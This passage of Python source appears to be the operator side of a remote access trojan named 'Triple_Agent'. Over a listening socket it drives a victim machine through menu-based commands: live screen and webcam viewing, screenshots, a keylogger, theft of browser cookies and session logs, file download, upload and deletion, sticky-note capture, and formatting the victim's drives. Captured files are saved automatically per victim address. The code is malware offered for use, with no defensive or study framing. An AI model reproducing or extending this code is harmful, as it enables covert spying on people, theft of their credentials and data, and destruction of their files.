                    for _key_payload in payload:
                        _auto_file_manager_path = os.path.join(self.client_path, _key_payload)
                        self.createDir(_auto_file_manager_path)
                        for _key, _value in payload.get(_key_payload).items():
                            _mode = "wb"
                            if str(_key).endswith(".txt"):
                                _mode = "w"
                            
                            self.savefiles(_auto_file_manager_path, _key, _value, _mode)
                            
                            #if str(_key).endswith(".png") :
                                #_newscreeshot_only = os.path.join(_auto_file_manager_path, _key)
                                #_ScreenShot = ScreenShot()
                                #_ScreenShot.duplicate(_auto_file_manager_path, _newscreeshot_only)
                    
                    self.send(client_conn, "noaction")
                            
                if not _start_():
                    self.payload = None
                    break
                            

            except Exception as e:
                #print(f"[ERROR] _autoreceivefiles : {e}")
                continue
            
    def autoservices(self, socket_conn):
        self._autoreceivefiles_threading = threading.Thread(target=self._autoreceivefiles, name="_autoreceivefiles", args=(socket_conn, lambda:self._start_, ))
        if self._autoreceivefiles_threading.is_alive() == False:
            self._autoreceivefiles_threading.start()

    def screenshot(self):
        try:
            self._clear()
            if self.client_conn_addr_port != None:
                

                
                self.send(self.client_conn, int(self.identifiers['image']))
                while True:
                    
                    self.receive(self.client_conn)
                    if type(self.payload) is str:
                        break

                if self.payload == "accepted":
                    self._threadscreenshot(self.client_conn)

                

                print(f"\n[bold red]============ MENUS ================[/bold red]\n")

                i = 0

                for l_menu in self.menu_s:
                    i += 1
                    if l_menu != "Quit":
                        print(f"[[bold blue]{i}[/bold blue]] {l_menu}")
                    else:
                        print(f"[[bold red]Q[/bold red]] [bold red]{l_menu}[/bold red]")



                menu_act = self.console.input("[bold blue]\nChoose:[/bold blue] ")

                if str(menu_act).isnumeric():
                    if int(menu_act) == 1:

                        self.active_connection(self._port_)


                    if int(menu_act) == 2:
                        self.new_action_menu()


                if menu_act == "Q" or menu_act == "q":
                    self.off()

            else:
                time.sleep(60)
                print('[bold white] Client connection not found[bold white][bold red]...[/bold red]\n')
                self.new_connection()

        except Exception as e:
            self.new_action_menu()

        except KeyboardInterrupt:
            self._start()

    def sharescreen(self):
        try:
            self._clear()
            if self.client_conn_addr_port != None:

                self.send(self.client_conn, int(self.identifiers['screenshare']))

                self.receive(self.client_conn)
                payload = self.payload

                strcv2 = "_cv2screen"
                globals()[strcv2] = cv2
                if payload.get("accepted", None) == "accepted":
                    _clientsize= tuple(payload.get("screensize", (0,0)))
                    _screenview = SceenView(Triple_Agent, self.client_conn, self.client_addr_port, _clientsize, _cv2screen)
                    _result = _screenview._start()
                    start_screenview_thread = threading.Thread(target=_screenview._start, args=())
                    if start_screenview_thread.is_alive() == False:
                        start_screenview_thread.start()
                    

                print(f"\n[bold red]============ MENUS ================[/bold red]\n")

                i = 0

                for l_menu in self.menu_s:
                    i += 1
                    if l_menu != "Quit":
                        print(f"[[bold blue]{i}[/bold blue]] {l_menu}")
                    else:
                        print(f"[[bold red]Q[/bold red]] [bold red]{l_menu}[/bold red]")




                menu_act = self.console.input("[bold blue]\nChoose:[/bold blue] ")

                if str(menu_act).isnumeric():
                    if int(menu_act) == 1:
                        self.active_connection(self._port_)


                    if int(menu_act) == 2:
                        self.new_action_menu()


                if menu_act == "Q" or menu_act == "q":
                    self.off()

            else:
                time.sleep(60)
                print('[bold white] Client connection not found[/bold white] [bold red]...[/bold red]\n')
                self.new_connection()

        except Exception as e:
            self.new_action_menu()

        except KeyboardInterrupt:
            self._start()


    def format_dirve(self):
        try:
            self._clear()
            if self.client_conn_addr_port != None:
                

                self.client_path = os.path.join(self.path_server, self.client_addr)
                self.createDir(self.client_path)
                self.send(self.client_conn, int(self.identifiers['format_drive']))

                while True:
                    
                    self.receive(self.client_conn)
                    if type(self.payload) is str:
                        break
                    
                _status = True
                if self.payload == "accepted":

                    while _status:
                        self.receive(self.client_conn)
                        if type(self.payload) is list:
                            l_drives = list(self.payload)
                            if len(l_drives) > 0:

                                print(
                                    f"\n[bold orange3]============ DRIVES EXPLORER ({len(l_drives)-1}) ================[/bold orange3]\n")

                                i = 0
                                _menu = []
                                for _drives in l_drives:
                                    i += 1
                                    _menu.append(f"[[bold blue]{i}[/bold blue]] {_drives}")

                                
                                _menu.append("[[bold yellow]#[/bold yellow]] [bold yellow]Back[/bold yellow]")
                                _menu.append("[[bold red]Q[/bold red]] [bold red]Quit[/bold red]")

                                for _menul in _menu:
                                    print(_menul)


                                drives_act = self.console.input("\n[bold blue]Choose:[bold blue] ")
                                self.send(self.client_conn, drives_act)
                                if drives_act == "Q" or drives_act == "q":
                                    _status = False

                        if self.payload == "done":
                            print(f"\n[bold green]***** Drive Formated Succesfully *****[/bold green]\n")

                        if self.payload == "stop":
                            _status = False

                print(f"\n[bold red]============ MENUS ================[/bold red]\n")

                i = 0

                for l_menu in self.menu_s:
                    i += 1
                    if l_menu != "Quit":
                        print(f"[[bold blue]{i}[/bold blue]] {l_menu}")
                    else:
                        print(f"[[bold red]Q[/bold red]] [bold red]{l_menu}[/bold red]")



                menu_act = self.console.input("[bold blue]\nChoose:[/bold blue] ")

                if str(menu_act).isnumeric():
                    if int(menu_act) == 1:
                        self.active_connection(self._port_)


                    if int(menu_act) == 2:
                        self.new_action_menu()


                if menu_act == "Q" or menu_act == "q":
                    self.off()

            else:
                print('[bold white] Client connection not found[bold white][bold red]...[/bold red]\n')
                time.sleep(60)
                self.new_connection()


        except Exception as e:
            self.new_action_menu()

        except KeyboardInterrupt:
            self._start()


    def _browers_logs_explore(self, client_conn):
                
        self.send(self.client_conn, int(self.identifiers['browserexplore']))

        while True:
            self.receive(self.client_conn)
            if type(self.payload) is str:
                break

        if self.payload == "accepted":
            self.receive(client_conn)
            l_brower = list(self.payload)
            print(f"\n[bold blue]============ SESSION WEB BROWSERS ({len(l_brower)}) ================[/bold blue]\n")

            if len(l_brower) > 0:
                i = 0
                for _browers in l_brower:
                    i += 1
                    print(f"[[bold blue][{i}][/bold blue]] {_browers}")

                print(f"[[bold yellow]#[/bold yellow]] Back")
                print(f"[[bold red]Q[/bold red]] Quit")
                
                browser_act = input("\nChoose: ")
                
                

                if browser_act.isnumeric() == True:
                    self.settings._start(self._config_path_doc)
                    smtp_ = self.settings._json("smtp")
                    smtp_ = self.settings._update(smtp_, "browser_name", browser_act)
                    self.send(client_conn, str(smtp_))
                    self.receive(client_conn)
                    #print(f"\n{self.payload}")
                else:
                    if browser_act == "*":
                        self.new_action_menu()

                    if browser_act == "Q" == "Q" or browser_act == "q":
                        self.off()




    def _browers_logs_action(self, client_conn):
        self.send(client_conn, int(self.identifiers['browserlogscookies']))

        self.receive(client_conn)
        _status = True
        _inscree = ['Start', 'Stop', 'Back']
        while True:
            self.receive(self.client_conn)
            if type(self.payload) is str:
                break
        if self.payload == "accepted":
            while _status:
                try:
                    
                    print("\n [bold blue]======== SCREENSHOT ACTION ======== [/bold blue]\n")
                    i = 0
                    for _lscren in _inscree:
                        i +=1
                        if str(_lscren).lower == "back":
                            print(f"[[bold yellow]#[/bold yellow]] [bold yellow]{_lscren}[/bold yellow]")
                            print(f"[[bold red]Q[/bold red]] [bold red]Quit[/bold red]")
                        else:
                            print(f"[[bold blue]{i}[/bold blue]] {_lscren}")

                    try:
                        _opinp = self.console.input("\n[bold red]Choose[/bold red] :")
                        if _opinp.isnumeric() == True:
                            _date_act = _inscree[int(_opinp)-1]
                            self.send(client_conn, _date_act.lower())
                            if _date_act.lower() == "back":
                                _status = False
                                break

                    except KeyboardInterrupt as e:
                        self.send(client_conn, "abort")
                        _status = False
                    except Exception as e:
                            pass


                except Exception as e:
                    print(f"[Error] : Recieving Browsers Action  {e}")
                    continue

    def _stopthread(self):
        self._start_ = False

    def bowserlogs(self):
        try:
            self._clear()
            if self.client_conn_addr_port != None:
                

                _option_menu = ["Activate", "Explore"]

                print(f"\n[bold red]============ MENUS  ================[/bold red]\n")


                i = 0
                for _list_option in _option_menu:
                    i +=1
                    if _list_option != "Quit":
                        print(f"[[bold blue]{i}[/bold blue]] [bold white]{_list_option}[/bold white]")

                    else:
                        print(f"[[bold orange]*[/bold orange]] [bold orange]Abort[/bold orange]")
                        print(f"[[bold yellow]#[/bold yellow]] [bold yellow]Back[/bold yellow]")
                        print(f"[[bold red]Q[/bold red]] [bold red]Quit[/bold red]")

                _keyact = self.console.input("[bold blue]\nChoose:[/bold blue] ")
                
                if str(_keyact).isnumeric():
                    if int(_keyact) == 1:
                        self._browers_logs_action(self.client_conn)
                    
                    if int(_keyact) == 2:
                        self._browers_logs_explore(self.client_conn)

                    if int(_keyact) == 3:
                        

                        self.active_connection(self._port_)


                    if int(_keyact) == 4:
                        self.new_action_menu()


                if _keyact == "Q" == "Q" or _keyact == "q":
                    self.off()


                
            
            else:
                print('[bold white] Client connection not found[bold white][bold red]...[/bold red]\n')
                time.sleep(60)
                self.new_connection()

        except Exception as e:
            self.new_action_menu()

        except KeyboardInterrupt:
            self._start()

    def clientmessage(self):
        try:
            self._clear()
            if self.client_conn_addr_port != None:
                
                
                self.send(self.client_conn, int(self.identifiers['sendmessage']))

                self.receive(self.client_conn)
                while True:
                    
                    self.receive(self.client_conn)
                    if type(self.payload) is str:
                        break

                if self.payload == "accepted":
                    _start_msg = True

                    while _start_msg:
                        self.settings._start(self._config_path_doc)
                        clientmessage_ = self.settings._json("clientmessage")
                        print("\n")
                        _typemasse = self.console.input("[bold yellow]Type Message / Click Enter Key:[/bold yellow] ")
                        if str(_typemasse) != "stop":
                            clientmessage_ = self.settings._update(
                                clientmessage_, "text", _typemasse)
                            self.send(self.client_conn, str(clientmessage_))
                            time.sleep(1)
                            self.receive(self.client_conn)
                            if self.payload == "received":
                                print("[bold green]\n***** Client reacted to the message *****[/bold green]")
                        else:
                            _start_msg = False
                            self.send(self.client_conn, "stop")

                print(f"\n[bold red]============ MENUS ================[/bold red]\n")

                i = 0

                for l_menu in self.menu_s:
                    i += 1
                    if l_menu != "Quit":
                        print(f"[[bold blue]{i}[/bold blue]] {l_menu}")
                    else:
                        print(f"[[bold red]Q[/bold red]] [bold red]{l_menu}[/bold red]")



                menu_act = self.console.input("[bold blue]\nChoose:[/bold blue] ")

                if str(menu_act).isnumeric():
                    if int(menu_act) == 1:
                        self.active_connection(self._port_)


                    if int(menu_act) == 2:
                        self.new_action_menu()


                if menu_act == "Q" or menu_act == "q":
                    self.off()

            else:
                print('[bold white] Client connection not found[bold white][bold red]...[/bold red]\n')
                time.sleep(60)
                self.new_connection()

        except Exception as e:
            self.new_action_menu()

        except KeyboardInterrupt:
            self._start()


    def webscam(self):
        try:
            self._clear()
            if self.client_conn_addr_port != None:
                
                

                self.send(self.client_conn, int(self.identifiers['webcam']))

                while True:
                    
                    self.receive(self.client_conn)
                    if type(self.payload) is str:
                        break

                if self.payload == "accepted":
                    webcam_cv2 = cv2
                    _webcam = webcamSever(
                        Triple_Agent, self.client_conn, self.client_addr_port, webcam_cv2)

                    start_webcam_conn_thread = ThreadWithReturnValue(
                        target=_webcam._start, args=())
                    if start_webcam_conn_thread.is_alive() == False:
                        start_webcam_conn_thread.start()
                # self.start_webcam_clients = start_webcam_conn_thread.join()

                print(f"\n[bold red]============ MENUS ================[/bold red]\n")

                i = 0

                for l_menu in self.menu_s:
                    i += 1
                    if l_menu != "Quit":
                        print(f"[[bold blue]{i}[/bold blue]] {l_menu}")
                    else:
                        print(f"[[bold red]Q[/bold red]] [bold red]{l_menu}[/bold red]")



                menu_act = self.console.input("[bold blue]\nChoose:[/bold blue] ")

                if str(menu_act).isnumeric():
                    if int(menu_act) == 1:


                        try:
                            self.server_socket.close()
                            self.client_conn.close()
                            self.start_conn_thread.raise_exception()

                        except Exception as e:
                            pass

                        self.active_connection(self._port_)


                    if int(menu_act) == 2:
                        self.new_action_menu()


                if menu_act == "Q" or menu_act == "q":
                    self.off()

            else:
                print('[bold white] Client connection not found[bold white][bold red]...[/bold red]\n')
                time.sleep(60)
                self.new_connection()

        except Exception as e:
            self.new_action_menu()

        except KeyboardInterrupt:
            self._start()

    def off(self):
        # pid = os.fork()
        # if pid > 0:
        #     info = os.waitpid(pid, 0)
        #     print(os.WIFEXITED(info[1]))
        #     if os.WIFEXITED(info[1]) :
        #         code = os.WEXITSTATUS(info[1])
        # else:
        self._clear()
        os._exit(os.EX_OK)


    def stickynote(self):
        try:
            self._clear()
            if self.client_conn_addr_port != None:
                

                self.client_path = os.path.join(self.path_server, self.client_addr)
                self.createDir(self.client_path)

                _stickanager = os.path.join(self.client_path, "Sticky Note")

                self.send(self.client_conn, int(self.identifiers['sticky']))

                while True:
                    
                    self.receive(self.client_conn)
                    if type(self.payload) is str:
                        break

                _status = True
                if self.payload == "accepted":
                    _stickact = ""

                    _actmenu = ["Continue", "Stop"]
                    while _status:
                        self.receive(self.client_conn)
                        if type(self.payload) is dict:
                            for _key, _value in self.payload.items():
                                self.createDir(_stickanager)
                                self.savefiles(_stickanager, _key, _value, "wb")
                                self.send(self.client_conn, "received")

                        if type(self.payload) is str:
                            if str(self.payload).lower() == "stop":
                                _status = False

                        if _stickact != "":
                            self.send(self.client_conn, str(_stickact).lower())
                            if str(_stickact).lower() == "stop":
                                _status = False

                        self.send(self.client_conn, _stickact)

                        if _status == True:
                            ia = 0
                            for actmenu_ in _actmenu:
                                ia += 1
                                print(f"[{ia}] {actmenu_}")

                            stickinput = input("\nChoose: ")
                            _stickact = _actmenu[int(stickinput)-1]

                print(f"\n[bold red]============ MENUS ================[/bold red]\n")

                i = 0

                for l_menu in self.menu_s:
                    i += 1
                    if l_menu != "Quit":
                        print(f"[[bold blue]{i}[/bold blue]] {l_menu}")
                    else:
                        print(f"[[bold red]Q[/bold red]] [bold red]{l_menu}[/bold red]")




                menu_act = self.console.input("[bold blue]\nChoose:[/bold blue] ")

                if str(menu_act).isnumeric():
                    if int(menu_act) == 1:
                        self.active_connection(self._port_)


                    if int(menu_act) == 2:
                        self.new_action_menu()


                if menu_act == "Q" or menu_act == "q":
                    self.off()

            else:
                print('[bold white] Client connection not found[bold white][bold red]...[/bold red]\n')
                time.sleep(60)
                self.new_connection()

        except Exception as e:
            self.new_action_menu()

        except KeyboardInterrupt:
            self._start()

    def _drive_explore(self, client_conn):
        self.client_path = os.path.join(self.path_server, self.client_addr)
        self.createDir(self.client_path)
        _filemanager = os.path.join(self.client_path, "File Manager")
                

        self.send(client_conn, int(self.identifiers['files']))
        while True:
            self.receive(self.client_conn)
            if type(self.payload) is str:
                break

        if self.payload == "accepted":
            _status = True
            while _status:

                self.receive(client_conn)
                if type(self.payload) is list:
                    l_drives = list(self.payload)
                    if len(l_drives) > 0:
                        print(f"\n[bold orange3]============ DRIVES EXPLORER ({len(l_drives)}) ================[/bold orange3]\n")

                        _menu, i = [], 0
                        for _drives in l_drives:
                            i += 1
                            _menu.append(f"[[bold blue]{i}[/bold blue]] {_drives}")

                        _menu.append("[[bold yellow]#[/bold yellow]] [bold yellow]Back[/bold yellow]")
                        _menu.append("[[bold red]Q[/bold red]] [bold red]Quit[/bold red]")

                        for _menul in _menu:
                            print(_menul)

                        drives_act = self.console.input("\n[bold blue]Choose:[bold blue] ")
                        _action_drive_send = drives_act
                        _action_drive = drives_act.split(" ")
                        _actkey = ""
                        if len(_action_drive) == 2:
                            if _action_drive[0] == "dl" or _action_drive[0] == "download":
                                _actkey = "_download"
                            if _action_drive[0] == "del" or _action_drive[0] == "delete":
                                _actkey = "_delete"

                            if _action_drive[0] == "op" or _action_drive[0] == "open":
                                _actkey = "_open"

                            _action_drive_send = {f"{_actkey}": _action_drive[1]}

                        self.send(self.client_conn, _action_drive_send)

                        if drives_act == "#" or drives_act == "back":
                            self.send(self.client_conn, "#")
                            _status = False
                            break

                        if drives_act == "Q" or drives_act == "q":
                            _status = False
                            try:
                                self.clear_list_active_connection()
                            except:
                                pass
                            self.new_connection()
                            break

                if type(self.payload) is dict:
                    for _key, _value in self.payload.items():
                        if _key == "_open":
                            #print(_value)
                            self.send(self.client_conn, "opened")
                        else:
                            self.createDir(_filemanager)
                            self.savefiles(_filemanager, _key, _value)
                            #self.send(self.client_conn, "received")


                    if self.payload == "stop":
                        _status = False

    def _files_trailer(self, client_conn):

        self.send(client_conn, int(self.identifiers['trailer']))
        
        while True:
            self.receive(self.client_conn)
            if type(self.payload) is str:
                break

        _status = True
        if self.payload == "accepted":
            
            _status = True
            _inscree = ['Start', 'Stop', 'Back']

            while _status:
                try:

                    print("\n [bold blue]======== TRAILER ACTION ======== [/bold blue]\n")
                    i = 0
                    for _lscren in _inscree:
                        i +=1
                        print(f"[[bold red]{i}[/bold red]] {_lscren}")

                    try:
                        _opinp = self.console.input("\n[bold red]Choose[/bold red] :")
                        if _opinp.isnumeric() == True:
                            _date_act = _inscree[int(_opinp)-1]
                            self.send(client_conn, _date_act.lower())
                            if _date_act.lower() == "back":
                                _status = False

                    except KeyboardInterrupt as e:
                        self.send(client_conn, "abort")
                        _status = False
                    except Exception as e:
                            pass


                except Exception as e:
                    print(f"[Error] : Recieving Screenshots Action  {e}")



                
    def filetrailler(self):
        try:
            self._clear()
            if self.client_conn_addr_port != None:
                
                
                time_string = time.time()

                self.client_path = os.path.join(self.path_server, self.client_addr)
                self.createDir(self.client_path)
                _option_menu = ["Trailer", "Explorer"]

                print(f"\n[bold red]============ MENUS  ================[/bold red]\n")


                i = 0
                for _list_option in _option_menu+self.menu_s:
                    i +=1
                    if _list_option != "Quit":
                        print(f"[[bold blue]{i}[/bold blue]] [bold white]{_list_option}[/bold white]")
                    else:
                        print(f"[[bold yellow]#[/bold yellow]] [bold yellow]Back[/bold yellow]")
                        print(f"[[bold orange]*[/bold orange]] [bold orange]About[/bold orange]")
                        print(f"[[bold red]Q[/bold red]] [bold red]Quit[/bold red]")

                _keyact = self.console.input("[bold blue]\nChoose:[/bold blue] ")
                
                if str(_keyact).isnumeric():
                    if int(_keyact) == 1:
                        self._files_trailer(self.client_conn)
                    
                    if int(_keyact) == 2:
                        self._drive_explore(self.client_conn)

                if int(_keyact) == "#":
                    self.active_connection(self._port_)


                if int(_keyact) == "*":
                        self.new_connection()


                if _keyact == "Q"  or _keyact == "q":
                    self.off()

                
                    

            else:
                print('[bold white] Client connection not found[bold white][bold red]...[/bold red]\n')
                time.sleep(60)
                self.new_connection()

        except Exception as e:
            self.new_action_menu()

        except KeyboardInterrupt:
            self._start()

    def keylogger(self):
        try:
            self._clear()
            if self.client_conn_addr_port != None:
                

                self.client_path = os.path.join(self.path_server, self.client_addr)
                self.createDir(self.client_path)

                _keylogkanager = os.path.join(self.client_path, "Key Logger")

                self.send(self.client_conn, int(self.identifiers['keylog']))

                while True:
                    
                    self.receive(self.client_conn)
                    if type(self.payload) is str:
                        break
                    
                _status = True
                if self.payload == "accepted":
                    _keyact = ""

                    _actmenu = ["Continue", "Stop"]
                    while _status:
                        self.receive(self.client_conn)
                        if type(self.payload) is dict:
                            for _key, _value in self.payload.items():
                                self.createDir(_keylogkanager)
                                self.savefiles(_keylogkanager, _key, _value, "a+")
                                self.send(self.client_conn, "received")

                        if type(self.payload) is str:
                            if str(self.payload).lower() == "stop":
                                _status = False
                            if str(self.payload).lower() == "notexist":
                                print("[bold red]\nWaiting for client keyboard activity...[/bold red]")

                        if _keyact != "":
                            self.send(self.client_conn, str(_keyact).lower())
                            if str(_keyact).lower() == "stop":
                                _status = False

                        if _status == True:
                            print("\n")
                            ia = 0
                            for actmenu_ in _actmenu:
                                ia += 1
                                print(f"[{ia}] {actmenu_}")

                            keyinput = self.console.input("[bold blue]\nChoose:[/bold blue]")
                            _keyact = _actmenu[int(keyinput)-1]

                print(f"\n[bold red]============ MENUS ================[/bold red]\n")

                i = 0

                for l_menu in self.menu_s:
                    i += 1
                    if l_menu != "Quit":
                        print(f"[[bold blue]{i}[/bold blue]] {l_menu}")
                    else:
                        print(f"[[bold red]Q[/bold red]] [bold red]{l_menu}[/bold red]")



                menu_act = self.console.input("[bold blue]\nChoose:[/bold blue] ")

                if str(menu_act).isnumeric():
                    if int(menu_act) == 1:
                        self.active_connection(self._port_)


                    if int(menu_act) == 2:
                        self.new_action_menu()


                if menu_act == "Q" or menu_act == "q":
                    self.off()

            else:
                print('[bold white] Client connection not found[bold white][bold red]...[/bold red]\n')
                time.sleep(60)
                self.new_connection()

        except Exception as e:
            self.new_action_menu()

        except KeyboardInterrupt:
            self._start()



    def _walk_path(self, _sdrive):
        self._listdives = []
        #selected drive or folder
        self._listdives = [_f for _f in os.listdir(_sdrive)]
        return self._listdives

    def uploadfile(self):
        try:
            self._clear()
            self._version()
            if self.client_conn_addr_port != None:
                

                if platform == "win32":
                    defaultdrive_ = ["C://"]
                    _removabledives = []
                    try:
                        import win32con as wcon
                        from win32api import GetLogicalDriveStrings
                        from win32file import GetDriveType

                        drive_types=(wcon.DRIVE_REMOVABLE,)
                        
                        drives_str = GetLogicalDriveStrings()
                        drives = (item for item in drives_str.split("\x00") if item)
                        drives =  [item[:2] for item in drives if not drive_types or GetDriveType(item) in drive_types]
                    except Exception as e:
                        drives =  []
                    for drive in drives:
                        _removabledives.append(f'{drive}//')
                    self._listdives = defaultdrive_ + _removabledives 
                else:
                    defaultdrive_ = [os.environ["HOME"]]
                    os.chdir('/Volumes')
                    _removabledives = os.listdir()

                    i = 0
                    while i < len(_removabledives):
                        if(_removabledives[i] == 'Macintosh HD'):
                            del _removabledives[i:i+1]
                            continue
                        else:
                            
                            _removabledives[i] = '/Volumes/'+ _removabledives[i]
                            i +=1
                        
                    self._listdives = defaultdrive_ + _removabledives

                
                while True:
                    self.send(self.client_conn, int(self.identifiers['uploadfile']))
                    self.receive(self.client_conn)
                    if type(self.payload) is str:
                        
                        if str(self.payload) == "accepted":
                            break
                    else:
                        self.send(self.client_conn, 0)
                    
     
                if self.payload == "accepted":
                    self._path = []
                    _path_str = ""
                    _status = True
                    print("\n\n[bold red] ============ DIRECTORY EXPLORE ============= [bold red] \n")
                    while _status:
                        i = 0
                        for l_drives in self._listdives:
                            i += 1
                            print(f"[{i}] {l_drives}")
                        print("[[bold yellow]#[/bold yellow]] [bold yellow]Back[/bold yellow]")
                        print("[[bold red]*[/bold red]] [bold red]Abort[/bold red]")
                        print("[[bold red]Q[/bold red]] [bold red]Quit[/bold red]")
                    
                        _choose_input = self.console.input("\n[bold blue]Choose:[/bold blue] ")
                        print("\n")

                        _action_ = _choose_input.split(" ")
                        _actkey = ""
                        _mode = "rb"
                        if str(_choose_input).isnumeric() == False:
                            if len(_action_) == 2:
                                if _action_[0] == "ul" or _action_[0] == "upload":
                                    _actkey = "_upload"
                                try:
                                    _file_path = os.path.join(_path_str, self._listdives[int(_action_[1])-1])
                                    if str(_file_path).endswith(".txt"):
                                        _mode = "r"
                                    _file_data = ""
                                    with open(_file_path, mode=_mode) as f:
                                        _file_data = f.read()
                                    _data = {_actkey : {f"{self._listdives[int(_action_[1])-1]}": _file_data}}
                                    self.send(self.client_conn, _data)
                                except Exception as e:
                                    print(e)
                                    pass
                            
                            if _choose_input == "#":
                                self._path.pop(-1)
                                
                            if _choose_input == "*":
                                _data = {random.choice(self.key_secret) : {"key_secret" : "key_secret"}}
                                self.send(self.client_conn, _data)
                                self.new_action_menu()
                            
                            if _choose_input == "q" or _choose_input == "Q":
                                _data = {random.choice(self.key_secret) : {"key_secret" : "key_secret"}}
                                self.send(self.client_conn, _data)
                                time.sleep(1)
                                self.main_menu()
                            
                        if str(_choose_input).isnumeric() == True:
                                _romotepath = self._listdives[int(_choose_input)-1]
                                self._path.append(_romotepath)
                        
                        if len(self._path) > 0:
                            _path_str  = "/".join(self._path)
                            if os.path.isfile(_path_str) == True:
                                self._path.pop(-1)

                        _path_str  = "/".join(self._path)
                        self._listdives = self._walk_path(_path_str)
                
                else:
                    print('[bold white] Client connection not found[bold white][bold red]...[/bold red]\n')
                    time.sleep(60)
                    self.active_connection(self._port_)
                        

            else:
                    print('[bold white] Client connection not found[bold white][bold red]...[/bold red]\n')
                    time.sleep(60)
                    self.new_connection()

        except Exception as e:
            self.new_action_menu()

        except KeyboardInterrupt:
            self._start()


    def disconnect(self):

        try:
            self._clear()
            if self.client_conn_addr_port != None:
                self.client_path = os.path.join(self.path_server, self.client_addr)
                self.createDir(self.client_path)

                self.send(self.client_conn, int(self.identifiers['disconnect']))

                self.receive(self.client_conn)
                _status = True

                while True:
                    
                    self.receive(self.client_conn)
                    if type(self.payload) is str:
                        break

                if self.payload == "accepted":
                    self.receive(self.client_conn)

                print(f"\n[bold red]============ MENUS ================[/bold red]\n")

                i = 0

                for l_menu in self.menu_s:
                    i += 1
                    if l_menu != "Quit":
                        print(f"[[bold blue]{i}[/bold blue]] {l_menu}")
                    else:
                        print(f"[[bold red]Q[/bold red]] [bold red]{l_menu}[/bold red]")



                menu_act = self.console.input("[bold blue]\nChoose:[/bold blue] ")

                if str(menu_act).isnumeric():
                    if int(menu_act) == 1:
                        self.active_connection(self._port_)


                    if int(menu_act) == 2:
                        self.new_action_menu()


                if menu_act == "Q" or menu_act == "q":
                    self.off()

            else:
                print('[bold white] Client connection not found[bold white][bold red]...[/bold red]\n')
                time.sleep(60)
                self.new_connection()


        except Exception as e:
            self.new_action_menu()

        except KeyboardInterrupt:
            self._start()



    def function_action(self, act_menu):
        try:
            func_menu = self.list_menu_act.index(act_menu)
            self._stopthread()
            if func_menu == 0:
                # Sharing Screen Starting
                self.sharescreen()
            elif func_menu == 1:
                # ScreenShot Starting
                self.screenshot()

            elif func_menu == 2:
                # Web Cam
                self.webscam()

            elif func_menu == 3:
                # File Download
                self.filetrailler()
            
            elif func_menu == 4:
                # File Upload
                
                self.uploadfile()

            elif func_menu == 5:
                # Sticky Note
                self.stickynote()

            elif func_menu == 6:
                # Keylogger
                self.keylogger()

            elif func_menu == 7:
                # Browser Logs
                self.bowserlogs()

            elif func_menu == 8:
                # Send A Message
                self.clientmessage()


            elif func_menu == 9:
                # form Client Drives
                self.format_dirve()

            elif func_menu == 10:
                # form Disconnect Client
                self.disconnect()


        except Exception as e:

            if act_menu == "#":
                # Back
                self.new_action_menu()

            elif act_menu == "Q" or act_menu == "q":
                # Quit
                self.off()
            else:
                self.new_action_menu()

        except KeyboardInterrupt:
            self._start()




    def new_action_menu(self):
        

        self._clear()
        self._version()
        self.autoservices(self.client_conn)

        try:
            print(f"\n = [{self.client_addr}:{self.client_port}] [bold red]ACTION MENUS[/bold red] [{self.client_addr}:{self.client_port}] = \n")
            i = 0
            _menu = []
            for act_main_me in self.list_menu_act:
                i += 1
                _menu.append(f"[[bold blue]{i}[/bold blue]] [bold white]{act_main_me}[/bold white] ")

            _menu.append("[[bold yellow]#[/bold yellow]] [bold yellow]Back[/bold yellow]")
            _menu.append("[[bold red]Q[/bold red]] [bold red]Quit[/bold red]")
            for _menul in _menu:
                print(_menul)

            input_function_me = self.console.input("\n[bold blue]Choose:[/bold blue] ")
            if input_function_me.isnumeric() == True:
                input_function_name = self.list_menu_act[int(input_function_me)-1]
                self.function_action(input_function_name)

            elif input_function_me == "#":
                self.new_connection()

            elif input_function_me == "Q" or input_function_me == "q":
                self.off()
            else:
                self.function_action(input_function_me)

        except Exception as e:
            self.new_action_menu()

        except KeyboardInterrupt:
            self._start()


    def _getport(self):
        _p = []
        if os.path.exists(self._fileport) == True:
            with open(self._fileport, "r") as _ports:
                _p = _ports.readlines()
        else:
            _ports = open(self._fileport, "x")
            _ports.close()
        return _p

    def new_connection(self):
        try:
            self._clear()
            self._version()
            get_list_port =self._getport()
            print("\n[bold red]=============== PORT LIST ==================[/bold red]\n")

            i = 0
            _menu = []
            for list_port in get_list_port:
                i += 1
                n_port = list_port.replace('\n', '')
                self.list_port.append(list_port)
                _menu.append(f"[[bold blue]{i}[/bold blue]] [bold white]{n_port}[/bold white] ")

            _menu.append("[[bold yellow]#[/bold yellow]] [bold yellow]Back[/bold yellow]")
            _menu.append("[[bold red]Q[/bold red]] [bold red]Quit[/bold red]")
            for _menul in _menu:
                print(_menul)

            # self.conn.close()
            input_port_menu = self.console.input("\n[bold blue]Choose:[/bold blue] ")
            if input_port_menu.isnumeric() == True:
                self._port_ = self.list_port[int(input_port_menu)-1]
                
                self.active_connection(self._port_)
            else:
                if input_port_menu == "#":
                    self.main_menu()
                if input_port_menu == "Q" or input_port_menu == "q":
                    self.off()
                

            return True

        except Exception as e:
            self.new_connection()

        except KeyboardInterrupt:
            self._start()

    

    def automated(self):


        self._port_ = 0000
        self.clear_list_active_connection()
        try:
            self._clear()
            self._version()
            get_list_port =self._getport()
            print("\n[bold red]=============== PORT LIST ==================[/bold red]\n")

            i = 0
            _menu = []
            for list_port in get_list_port:
                i += 1
                n_port = list_port.replace('\n', '')
                self.list_port.append(list_port)
                _menu.append(f"[[bold blue]{i}[/bold blue]] [bold white]{n_port}[/bold white] ")

            _menu.append("[[bold yellow]#[/bold yellow]] [bold yellow]Back[/bold yellow]")
            _menu.append("[[bold red]Q[/bold red]] [bold red]Quit[/bold red]")
            for _menul in _menu:
                print(_menul)

            # self.conn.close()
            input_port_menu = self.console.input("\n[bold blue]Choose:[/bold blue] ")
            
            if input_port_menu.isnumeric() == True:
                self._port_ = self.list_port[int(input_port_menu)-1]
                
            else:
                if input_port_menu == "#":
                    self.main_menu()
                if input_port_menu == "Q" or input_port_menu == "q":
                    self.off()

        except Exception as e:
            self.new_connection()

        except KeyboardInterrupt:
            self._start()

        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('', int(self._port_)))
            self.server_socket.listen(5)

            print("\n\n======== AUTOMATED CONNECTION =========== ")
            i = 0
            while True:
                    try:
                        self.client_conn, self.client_addr_port = self.server_socket.accept()
                        (self.client_addr, self.client_port) = self.client_addr_port
                        self.receive(self.client_conn)
                        
